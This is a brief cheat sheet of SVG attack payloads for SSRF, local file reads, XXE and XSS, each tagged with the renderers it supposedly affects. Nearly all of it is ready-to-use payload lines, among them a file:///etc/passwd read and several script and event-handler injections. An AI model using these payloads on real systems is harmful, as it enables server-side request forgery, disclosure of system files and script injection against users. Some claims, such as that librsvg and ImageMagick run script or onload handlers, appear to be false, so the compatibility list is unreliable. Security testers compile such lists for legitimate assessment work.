# Detailed SVG Techniques

## SSRF
1. **<image xlink:href="http://…">** - SVG root - Batik, librsvg, ImageMagick, Resvg, Chrome, Firefox
2. **<use xlink:href="http://…">** - SVG root - Batik, librsvg, ImageMagick, Chrome, Firefox
3. **<link rel="stylesheet" href="http://…">** - SVG root - Batik, librsvg, Chrome, Firefox
4. **@import url(http://…)** - SVG style - Batik, librsvg, Chrome, Firefox
5. **<?xml-stylesheet href="http://…"?>** - SVG root - Batik, librsvg, Chrome, Firefox
6. **<?xml-stylesheet href="http://…" type="text/xsl"?>** - SVG root - XSLT processors, Chrome
7. **<script src="http://…">** - SVG root - Batik, librsvg, Chrome, Firefox
8. **<foreignObject><iframe src="http://…">** - SVG root - Chrome, Firefox, Batik

## LFI
1. **<image href="file:///etc/passwd">** - SVG root - librsvg, ImageMagick

## XXE
1. **DOCTYPE + ENTITY direct** - SVG root - Batik, Inkscape, XML parsers

## XSS
1. **<svg onload=alert(1)>** - SVG root - ALL SVG parsers (Batik, librsvg, Chrome, ImageMagick, browsers)
2. **<script>alert(1)</script>** - SVG root - ALL SVG parsers (Batik, librsvg, Chrome, ImageMagick, browsers)
3. **<image href="x" onerror=alert(1)>** - SVG root - ALL
4. **<animate onbegin=alert(1)>** - SVG root - All except some WAF
5. **<script src="javascript:alert(1)">** - SVG root - Chrome, Firefox
6. **<image onload="alert(1)">** - SVG root - Chrome, Firefox
7. **<foreignObject><iframe src="data:text/html,…">** - SVG root - Chrome, Firefox

